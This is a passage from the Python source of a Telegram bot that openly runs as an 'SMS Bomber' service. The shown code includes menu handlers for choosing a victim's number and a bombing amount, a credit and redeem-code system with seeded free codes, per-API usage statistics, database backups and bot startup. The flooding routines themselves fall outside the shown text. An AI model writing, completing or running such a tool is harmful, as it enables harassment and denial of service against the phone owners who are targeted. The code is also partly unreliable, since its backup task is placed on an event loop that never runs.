        if msg == "👥 Users List": admin_users_list(update, context); return
        if msg == "📋 API List": admin_api_list(update, context); return
        if msg == "🔙 Back":
            update.message.reply_text("Main Menu", reply_markup=get_main_keyboard())
            context.user_data.clear(); return
        if context.user_data.get('admin_state'):
            admin_state_handler(update, context); return
    if msg == "🔙 Back":
        update.message.reply_text("Main Menu", reply_markup=get_main_keyboard())
        context.user_data.clear(); return
    if msg == "📨 Send SMS": cmd_sms(update, context); return
    if msg == "💣 SMS Bomber": cmd_bomber(update, context); return
    if msg == "👤 My Profile": profile(update, context); return
    if msg == "🎁 Redeem Code": redeem(update, context); return
    if msg == "📊 My Stats": stats(update, context); return
    if msg == "📞 Contact Admin": contact(update, context); return
    state = context.user_data.get('state')
    if state == 'sms_number': sms_number(update, context); return
    elif state == 'sms_message': sms_message(update, context); return
    elif state == 'bomber_number': bomber_number(update, context); return
    elif state == 'bomber_amount': bomber_amount(update, context); return
    elif state == 'redeem_code': redeem_process(update, context); return
    update.message.reply_text("❌ Use buttons!", reply_markup=get_main_keyboard())

async def init_db():
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, balance INTEGER DEFAULT 10, total_sms INTEGER DEFAULT 0, total_bombing INTEGER DEFAULT 0, join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP, status TEXT DEFAULT 'active')")
            await db.execute("CREATE TABLE IF NOT EXISTS redeem_codes (code TEXT PRIMARY KEY, amount INTEGER, usages INTEGER, created_by INTEGER, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
            await db.execute("CREATE TABLE IF NOT EXISTS redeem_history (user_id INTEGER, code TEXT, redeemed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (user_id, code))")
            await db.execute("CREATE TABLE IF NOT EXISTS api_usage (id INTEGER PRIMARY KEY AUTOINCREMENT, api_name TEXT, user_id INTEGER, success INTEGER, usage_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
            await db.execute("CREATE TABLE IF NOT EXISTS api_stats (api_name TEXT PRIMARY KEY, total_calls INTEGER DEFAULT 0, total_success INTEGER DEFAULT 0, total_failed INTEGER DEFAULT 0, last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
            await db.execute("CREATE TABLE IF NOT EXISTS user_api_stats (user_id INTEGER, api_name TEXT, total_calls INTEGER DEFAULT 0, last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (user_id, api_name))")
            await db.execute("CREATE TABLE IF NOT EXISTS admin_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, admin_id INTEGER, action TEXT, target_id INTEGER, details TEXT, log_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
            await db.execute("INSERT OR IGNORE INTO redeem_codes (code, amount, usages, created_by) VALUES ('FREE50',50,100,?)", (ADMIN_ID,))
            await db.execute("INSERT OR IGNORE INTO redeem_codes (code, amount, usages, created_by) VALUES ('WELCOME10',10,200,?)", (ADMIN_ID,))
            await db.commit()
            logger.info("Database initialized")
    except Exception as e:
        logger.error(f"DB init error: {e}")

async def backup_database_async():
    while True:
        await asyncio.sleep(21600)
        try:
            backup_file = os.path.join(BACKUP_DIR, f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db")
            shutil.copy2(DB_PATH, backup_file)
            logger.info(f"Backup created: {backup_file}")
        except Exception as e:
            logger.error(f"Backup failed: {e}")

def main():
    try:
        print("=" * 60)
        print("SMS BOMBER BOT STARTING (Updater v13.7)...")
        print(f"APIs: {len(WORKING_APIS)}")
        print(f"Admin: {ADMIN_ID}")
        print(f"DB: {DB_PATH}")
        print("=" * 60)

        # Initialize database
        asyncio.run(init_db())
        # Start backup task in background
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.create_task(backup_database_async())
        # Don't close loop, keep running

        updater = Updater(BOT_TOKEN, use_context=True)
        dp = updater.dispatcher

        dp.add_handler(CommandHandler("start", start))
        dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

        updater.start_polling()
        print("Bot is RUNNING!")
        print("=" * 60)
        updater.idle()

    except Exception as e:
        logger.error(f"Main error: {e}")
        print(f"Error: {e}")
        raise

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Stopped!")
    except Exception as e:
        print(f"Fatal: {e}")
